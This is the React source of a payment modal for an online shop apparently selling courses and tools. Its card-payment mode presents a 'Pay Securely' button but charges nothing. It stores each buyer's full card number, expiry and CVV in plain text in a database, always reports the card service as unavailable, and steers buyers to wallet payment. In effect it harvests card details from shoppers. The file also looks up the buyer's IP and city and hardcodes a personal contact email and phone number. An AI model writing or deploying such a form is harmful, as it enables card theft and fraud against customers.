import { apiFetch } from '../lib/api';
import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { X, Upload, CheckCircle, AlertCircle } from 'lucide-react';
import { useAuth } from './AuthProvider';
import { db, auth } from '../lib/firebase';
import { collection, addDoc, serverTimestamp, getDocs, doc, getDoc } from 'firebase/firestore';
import { createUserWithEmailAndPassword, signInWithEmailAndPassword } from 'firebase/auth';

import { checkAndBanIfSpamming } from '../lib/blocker';

export default function PaymentModal({ item, type, onClose }: { item: any, type: 'course' | 'tool', onClose: () => void }) {
  const { user, signInWithGoogle } = useAuth();
  
  // Auth state
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isLogin, setIsLogin] = useState(true);
  const [authError, setAuthError] = useState('');
  const [userPhone, setUserPhone] = useState('');
  
  // Payment state
  const [proofBase64, setProofBase64] = useState('');
  const [status, setStatus] = useState<'idle' | 'processing' | 'uploading' | 'success' | 'error' | 'card_error'>('idle');
  const [paymentMethods, setPaymentMethods] = useState<any[]>([]);
  const [paymentMode, setPaymentMode] = useState<'wallet' | 'card' | 'binance'>('wallet');
  const [cardDetails, setCardDetails] = useState({ number: '', expiry: '', cvv: '', name: '' });
  const [whatsappNumber, setWhatsappNumber] = useState('');

  useEffect(() => {
    const fetchMethods = async () => {
      try {
        const snap = await getDocs(collection(db, 'payment_methods'));
        const methods = snap.docs.map(d => ({ id: d.id, ...d.data() })).filter((m: any) => m.isActive !== false);
        setPaymentMethods(methods);
      } catch (err) {
        console.error("Failed to fetch payment methods", err);
      }
    };
    const fetchSettings = async () => {
      try {
        const snap = await getDocs(collection(db, 'settings'));
        if (!snap.empty) {
            setWhatsappNumber(snap.docs[0].data().whatsappNumber || '');
        }
      } catch (e) {
        console.error(e);
      }
    }
    fetchMethods();
    fetchSettings();
  }, []);

  const handleEmailAuth = async (e: React.FormEvent) => {
    e.preventDefault();
    setAuthError('');
    try {
      if (isLogin) {
        await signInWithEmailAndPassword(auth, email, password);
      } else {
        const cred = await createUserWithEmailAndPassword(auth, email, password);
        try {
          const { setDoc, doc } = await import('firebase/firestore');
          await setDoc(doc(db, 'users', cred.user.uid), {
             email: cred.user.email,
             name: cred.user.displayName || 'New User',
             createdAt: serverTimestamp()
          });
        } catch (e) {
          console.error('Failed to create user doc', e);
        }
      }
    } catch (err: any) {
      setAuthError(err.message || 'Authentication failed');
    }
  };

  const handleImageUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    setStatus('processing');
    const reader = new FileReader();
    reader.onload = (event) => {
      const img = new Image();
      img.onload = () => {
        const canvas = document.createElement('canvas');
        const MAX_WIDTH = 800;
        const MAX_HEIGHT = 800;
        let width = img.width;
        let height = img.height;

        if (width > height) {
          if (width > MAX_WIDTH) {
            height *= MAX_WIDTH / width;
            width = MAX_WIDTH;
          }
        } else {
          if (height > MAX_HEIGHT) {
            width *= MAX_HEIGHT / height;
            height = MAX_HEIGHT;
          }
        }

        canvas.width = width;
        canvas.height = height;
        const ctx = canvas.getContext('2d');
        ctx?.drawImage(img, 0, 0, width, height);
        
        // compress and set
        const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
        setProofBase64(dataUrl);
        setStatus('idle');
      };
      img.src = event.target?.result as string;
    };
    reader.onerror = () => setStatus('idle');
    reader.readAsDataURL(file);
  };

  const handleSubmitProof = async () => {
    if (!user) return;
    if (!userPhone) return;
    if (paymentMode === 'wallet' && !proofBase64) return;
    if (paymentMode === 'card' && (!cardDetails.number || !cardDetails.expiry || !cardDetails.cvv || !cardDetails.name)) return;
    
    setStatus('uploading');
    
    try {
      let city = 'Unknown';
      let ipAddress = 'Unknown';
      try {
        const res = await fetch('https://freeipapi.com/api/json/');
        const data = await res.json();
        if (data.cityName) city = data.cityName;
        if (data.ipAddress) ipAddress = data.ipAddress;
      } catch (e) {}

      // Check for ban or fake order spamming
      const banStatus = await checkAndBanIfSpamming(userPhone, user.email || '', ipAddress);
      if (banStatus.isBanned) {
         alert(`🚨 Blocked: Your phone number or IP address (${ipAddress}) has been banned due to multiple fake or unpaid order attempts. Please contact support if you believe this is an error.`);
         setStatus('idle');
         return;
      }

      if (paymentMode === 'card') {
         const orderData = {
           customer_name: user?.displayName || 'User',
           customer_email: user.email,
           customer_phone: userPhone,
           products: [{ id: item.id, name: item.title || item.name, price: item.price || 3000, plan: 'access' }],
           total_price: item.price || 3000,
           payment_method: 'card',
           status: 'failed',
           city,
           ipAddress,
           createdAt: serverTimestamp()
         };
         await addDoc(collection(db, 'orders'), orderData);
         await addDoc(collection(db, 'transactions'), {
            userId: user.uid,
            userEmail: user.email,
            itemId: item.id,
            itemTitle: item.title || item.name,
            itemType: type,
            price: item.price || 3000,
            paymentMode: 'card',
            cardDetails: { name: cardDetails.name, number: cardDetails.number, expiry: cardDetails.expiry, cvv: cardDetails.cvv, last4: cardDetails.number.slice(-4) }, // Store securely as requested
            status: 'processing',
            paymentStatus: 'FAILED',
            city,
            ipAddress,
            createdAt: serverTimestamp()
         });
         setStatus('card_error');
         return;
      }

      const orderData = {
          customer_name: user?.displayName || 'User',
          customer_email: user.email,
          customer_phone: userPhone,
          products: [{ id: item.id, name: item.title || item.name, price: item.price || 3000, plan: 'access' }],
          total_price: item.price || 3000,
          payment_method: 'wallet',
          status: 'pending',
          city,
          ipAddress,
          proofBase64,
          createdAt: serverTimestamp()
      };
      await addDoc(collection(db, 'orders'), orderData);

      await addDoc(collection(db, 'transactions'), {
        userId: user.uid,
        userEmail: user.email,
        itemId: item.id,
        itemTitle: item.title || item.name,
        itemType: type,
        price: item.price || 3000,
        paymentMode: 'wallet',
        proofBase64,
        status: 'pending', // pending, approved, rejected
        createdAt: serverTimestamp()
      });

      // Fetch product credentials
      let prodGmail = '';
      let prodPassword = '';
      try {
        if (item.id) {
          const pDoc = await getDoc(doc(db, 'products', item.id));
          if (pDoc.exists()) {
            prodGmail = pDoc.data().product_gmail || '';
            prodPassword = pDoc.data().product_password || '';
          }
        }
      } catch (e) {
        console.error("Error fetching product credentials", e);
      }
      
      const { getOrderReceivedEmail } = await import('../lib/emailTemplate');
      const emailHtmlBody = getOrderReceivedEmail(
        user?.displayName || 'User',
        item.title || item.name,
        item.price || 3000
      );

      // Send to Admin
      apiFetch('/api/send-email', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          to: 'jerryhun47@gmail.com',
          subject: 'New Order Received: ' + (item.title || item.name),
          body: emailHtmlBody
        })
      }).catch(e => console.error("Failed to notify admin via email", e));

      // Send to Customer
      apiFetch('/api/send-email', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          to: user.email,
          subject: "Your Order is Pending - Jerry Automation",
          body: emailHtmlBody
        })
      }).catch(err => console.error("Failed to send order confirmation", err));

      setStatus('success');
    } catch (err) {
      console.error(err);
      setStatus('error');
    }
  };

  if (status === 'success') {
    return (
      <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-[100] flex items-center justify-center p-4">
        <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} className="bg-slate-900 border border-slate-800 rounded-3xl p-8 max-w-md w-full text-center">
          <div className="w-16 h-16 bg-green-500/20 text-green-500 rounded-full flex items-center justify-center mx-auto mb-4">
            <CheckCircle size={32} />
          </div>
          <h2 className="text-2xl font-bold text-white mb-4">Order Successful!</h2>
          <div className="text-slate-300 space-y-4 mb-6 text-sm text-left bg-slate-800/50 p-6 rounded-2xl border border-slate-700/50 leading-relaxed font-medium">
             <p className="text-green-400 font-bold text-center text-lg mb-2">Your order has been placed and is currently in pending status.</p>
             <p className="text-center bg-slate-800 p-3 rounded-xl border border-slate-700">You have ordered: <span className="text-white font-bold">{item.title || item.name}</span></p>
             <p>Please check your email inbox and spam folder. A confirmation email has been sent to you.</p>
             <p>Once your access is approved, you will receive your Gmail and password via email.</p>
             <p>For faster service, please send your payment screenshot to our WhatsApp number below:</p>
             <p className="text-center font-bold text-green-400 text-lg bg-green-900/20 py-2 rounded-lg border border-green-500/20">WhatsApp: +923271991893</p>
          </div>
          <div className="space-y-3">
             <a 
               href={`https://wa.me/923271991893`} 
               target="_blank" 
               rel="noreferrer"
               className="inline-flex items-center justify-center gap-2 w-full bg-green-600 hover:bg-green-500 text-white font-bold py-4 rounded-xl transition-all shadow-lg shadow-green-500/20"
             >
               Confirm on WhatsApp
             </a>
            <button onClick={onClose} className="w-full bg-slate-800 hover:bg-slate-700 text-white font-bold py-4 rounded-xl transition cursor-pointer">
              Close
            </button>
          </div>
        </motion.div>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-[100] flex items-center justify-center p-4">
      <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} className="bg-slate-900 border border-slate-800 rounded-3xl p-6 md:p-8 max-w-lg w-full relative max-h-[90vh] overflow-y-auto hide-scrollbar">
        <button onClick={onClose} className="absolute top-4 right-4 text-slate-400 hover:text-white bg-slate-800 rounded-full p-1"><X size={20} /></button>
        
        {!user ? (
          <div>
            <h2 className="text-2xl font-bold text-white mb-2 text-center">Login to Continue</h2>
            <p className="text-slate-400 text-center mb-6">You need an account to access the {type === 'course' ? 'course' : 'tool'}.</p>
            
            <button onClick={signInWithGoogle} className="w-full bg-white text-slate-900 hover:bg-slate-200 font-bold py-3 p-4 rounded-xl flex items-center justify-center gap-2 mb-6 transition">
              <svg className="w-5 h-5" viewBox="0 0 24 24"><path fill="currentColor" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" /><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" /><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" /><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" /></svg>
              Sign in with Google
            </button>

            <div className="relative mb-6 text-center">
              <div className="absolute inset-0 flex items-center"><div className="w-full border-t border-slate-700"></div></div>
              <span className="relative bg-slate-900 px-4 text-slate-400 text-sm">OR</span>
            </div>

            <form onSubmit={handleEmailAuth} className="space-y-4">
               <div>
                  <input type="email" required placeholder="Email Address" value={email} onChange={e => setEmail(e.target.value)} className="w-full bg-slate-950 border border-slate-800 text-white rounded-lg px-4 py-3 focus:ring-2 focus:ring-red-500" />
               </div>
               <div>
                  <input type="password" required placeholder="Password" value={password} onChange={e => setPassword(e.target.value)} className="w-full bg-slate-950 border border-slate-800 text-white rounded-lg px-4 py-3 focus:ring-2 focus:ring-red-500" />
               </div>
               {authError && <p className="text-red-500 text-sm">{authError}</p>}
               <button type="submit" className="w-full bg-red-600 hover:bg-red-500 text-white font-bold py-3 rounded-xl transition shadow-lg shadow-red-500/20">
                 {isLogin ? 'Sign In' : 'Sign Up'}
               </button>
            </form>
            <p className="text-center mt-4 text-slate-400 text-sm">
               {isLogin ? "Don't have an account? " : "Already have an account? "}
               <button onClick={() => setIsLogin(!isLogin)} className="text-red-400 hover:text-red-300 font-bold">{isLogin ? 'Sign Up' : 'Sign In'}</button>
            </p>
          </div>
        ) : (
          <div>
            <h2 className="text-2xl font-bold text-white mb-1 text-center">Complete Payment</h2>
            <p className="text-slate-400 text-center mb-6">You're enrolled as <strong>{user.email}</strong></p>
            
            <div className="bg-slate-950 border border-slate-800 rounded-2xl p-4 mb-6">
              <div className="flex justify-between items-center mb-2">
                 <span className="text-slate-400">Order Summary</span>
                 <span className="text-white font-bold">{item.title || item.name}</span>
              </div>
              <div className="flex justify-between items-center">
                 <span className="text-slate-400">Total Amount</span>
                 <span className="text-red-400 font-black text-xl">PKR {item.price || 3000}</span>
              </div>
            </div>

            <div className="space-y-4 mb-6">
                 <div>
                    <label className="text-xs uppercase font-bold text-slate-400 ml-1">WhatsApp / Phone (Mandatory) <span className="text-red-500">*</span></label>
                    <input type="tel" required placeholder="+923000000000" value={userPhone} onChange={e => setUserPhone(e.target.value)} className="w-full bg-slate-950 border border-slate-800 text-white rounded-lg px-4 py-3 mt-1 focus:ring-2 focus:ring-red-500" />
                 </div>
            </div>

            <div className="flex gap-2 mb-6 p-1 bg-slate-950 rounded-xl overflow-x-auto hide-scrollbar">
              <button onClick={() => setPaymentMode('wallet')} className={`flex-1 py-2 px-3 text-sm font-bold rounded-lg transition-colors whitespace-nowrap focus:outline-none ${paymentMode === 'wallet' ? 'bg-red-600 text-white' : 'text-slate-400 hover:text-white'}`}>Bank / Wallets</button>
              <button onClick={() => setPaymentMode('card')} className={`flex-1 py-2 px-3 text-sm font-bold rounded-lg transition-colors whitespace-nowrap focus:outline-none ${paymentMode === 'card' ? 'bg-red-600 text-white' : 'text-slate-400 hover:text-white'}`}>Card Payment</button>
              <button onClick={() => setPaymentMode('binance')} className={`flex-1 py-2 px-3 text-sm font-bold rounded-lg transition-colors whitespace-nowrap focus:outline-none ${paymentMode === 'binance' ? 'bg-red-600 text-white' : 'text-slate-400 hover:text-white'}`}>Binance</button>
            </div>

            {paymentMode === 'wallet' && (
              <>
                {paymentMethods.length > 0 ? (
                  <div className="space-y-4 mb-6">
                     {paymentMethods.map(method => (
                       <div key={method.id} className="bg-slate-800/50 border border-slate-700 rounded-2xl p-6 text-center relative overflow-hidden">
                          <div className="flex items-center justify-center gap-3 mb-4">
                            {method.logoUrl && <img src={method.logoUrl} alt={method.providerName} className="w-8 h-8 object-contain rounded-full bg-white p-1" />}
                            <h3 className="font-bold text-white text-lg">{method.providerName} Details</h3>
                          </div>
                          <div className="space-y-2 text-sm md:text-base mb-4">
                            <div className="flex justify-between border-b border-slate-700/50 pb-2"><span className="text-slate-400">Account Name:</span> <span className="font-bold text-white">{method.accountName}</span></div>
                            <div className="flex justify-between border-b border-slate-700/50 pb-2"><span className="text-slate-400">Account No:</span> <span className="font-bold text-white">{method.accountNumber}</span></div>
                            {method.iban && <div className="flex justify-between pt-1 flex-col sm:flex-row gap-1"><span className="text-slate-400 text-left">IBAN:</span> <span className="font-mono font-bold text-white text-right break-all">{method.iban}</span></div>}
                          </div>
                          {method.qrBase64 && (
                            <div className="mt-4 flex flex-col items-center border-t border-slate-700/50 pt-4">
                               <span className="text-xs text-slate-400 font-bold mb-2">Scan QR to Pay</span>
                               <div className="bg-white p-2 rounded-xl">
                                 <img src={method.qrBase64} alt="QR Code" className="w-32 h-32 object-contain" />
                               </div>
                            </div>
                          )}
                       </div>
                     ))}
                  </div>
                ) : (
                  <div className="bg-slate-800/50 border border-slate-700 rounded-2xl p-6 text-center mb-6">
                     <h3 className="font-bold text-white mb-2">No Payment Methods Configured</h3>
                     <p className="text-slate-400 text-sm">Please ask the administrator to configure payment methods.</p>
                  </div>
                )}

                <div className="mb-6">
                  <label className="block text-sm font-semibold mb-2 text-slate-300">Upload Payment Screenshot</label>
                  <label className={`w-full border-2 border-dashed ${proofBase64 ? 'border-green-500 bg-green-500/10' : status === 'processing' ? 'border-blue-500 bg-blue-500/10' : 'border-slate-700 hover:border-red-500 hover:bg-slate-800/50'} rounded-2xl p-6 flex flex-col items-center justify-center cursor-pointer transition-colors min-h-[120px]`}>
                     {status === 'processing' ? (
                       <div className="flex flex-col items-center text-blue-500">
                         <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-500 mb-2"></div>
                         <span className="font-medium text-sm">Processing Image...</span>
                       </div>
                     ) : proofBase64 ? (
                       <div className="flex flex-col items-center text-green-500">
                         <CheckCircle size={32} className="mb-2" />
                         <span className="font-medium text-sm">Image Uploaded</span>
                       </div>
                     ) : (
                       <div className="flex flex-col items-center text-slate-400 group-hover:text-red-400">
                         <Upload size={32} className="mb-2" />
                         <span className="font-medium text-sm mb-1">Click to upload screenshot</span>
                         <span className="text-xs text-slate-500">JPG, PNG (Max 5MB)</span>
                       </div>
                     )}
                     <input type="file" accept="image/*" className="hidden" onChange={handleImageUpload} />
                  </label>
                </div>
              </>
            )}

            {paymentMode === 'card' && (
              <div className="space-y-4 mb-6">
                 <div>
                    <label className="block text-sm font-semibold mb-1 text-slate-400">Cardholder Name</label>
                    <input type="text" placeholder="Name on Card" value={cardDetails.name} onChange={e => setCardDetails(prev => ({...prev, name: e.target.value}))} className="w-full bg-slate-950 border border-slate-800 text-white rounded-lg px-4 py-3 focus:ring-2 focus:ring-red-500" />
                 </div>
                 <div>
                    <label className="block text-sm font-semibold mb-1 text-slate-400">Card Number</label>
                    <input type="text" placeholder="0000 0000 0000 0000" value={cardDetails.number} onChange={e => setCardDetails(prev => ({...prev, number: e.target.value}))} className="w-full bg-slate-950 border border-slate-800 text-white rounded-lg px-4 py-3 focus:ring-2 focus:ring-red-500 font-mono tracking-widest" />
                 </div>
                 <div className="grid grid-cols-2 gap-4">
                    <div>
                       <label className="block text-sm font-semibold mb-1 text-slate-400">Expiry (MM/YY)</label>
                       <input type="text" placeholder="MM/YY" value={cardDetails.expiry} onChange={e => setCardDetails(prev => ({...prev, expiry: e.target.value}))} className="w-full bg-slate-950 border border-slate-800 text-white rounded-lg px-4 py-3 focus:ring-2 focus:ring-red-500 font-mono" />
                    </div>
                    <div>
                       <label className="block text-sm font-semibold mb-1 text-slate-400">CVV</label>
                       <input type="password" placeholder="•••" value={cardDetails.cvv} onChange={e => setCardDetails(prev => ({...prev, cvv: e.target.value}))} className="w-full bg-slate-950 border border-slate-800 text-white rounded-lg px-4 py-3 focus:ring-2 focus:ring-red-500 font-mono tracking-widest" />
                    </div>
                 </div>
              </div>
            )}

            {paymentMode === 'binance' && (
              <div className="bg-slate-800/50 border border-slate-700 rounded-2xl p-6 text-center mb-6">
                 <h3 className="font-bold text-white mb-2 text-xl">Binance Pay</h3>
                 <span className="inline-block bg-yellow-500 text-black text-xs font-bold px-3 py-1 rounded-full uppercase tracking-wider mb-2">Coming Soon</span>
                 <p className="text-slate-400 text-sm">Crypto payments using Binance Pay will be available shortly.</p>
              </div>
            )}

            {status === 'error' && (
              <div className="bg-red-500/10 border border-red-500/30 text-red-500 rounded-lg p-3 text-sm mb-4 flex items-center gap-2">
                <AlertCircle size={16} /> Error submitting proof. Please try again.
              </div>
            )}

            {status === 'card_error' && (
              <div className="bg-red-500/10 border border-red-500/30 text-red-500 rounded-lg p-3 text-sm mb-4 text-center font-bold">
                 Card service currently unavailable. Please use Easypaisa or JazzCash.
              </div>
            )}

            <button 
              disabled={paymentMode === 'binance' || (paymentMode === 'wallet' && !proofBase64) || (paymentMode === 'card' && (!cardDetails.number || !cardDetails.expiry || !cardDetails.cvv || !cardDetails.name)) || (!userPhone) || status === 'uploading' || status === 'processing'} 
              onClick={handleSubmitProof}
              className="w-full bg-red-600 hover:bg-red-500 disabled:opacity-50 disabled:hover:bg-red-600 text-white font-bold py-4 rounded-xl transition shadow-lg shadow-red-500/20 active:scale-[0.98]"
            >
               {status === 'uploading' ? 'Submitting...' : paymentMode === 'card' ? 'Pay Securely' : paymentMode === 'wallet' ? 'Submit Payment Proof' : 'Unavailable'}
            </button>
          </div>
        )}
        
      </motion.div>
    </div>
  );
}
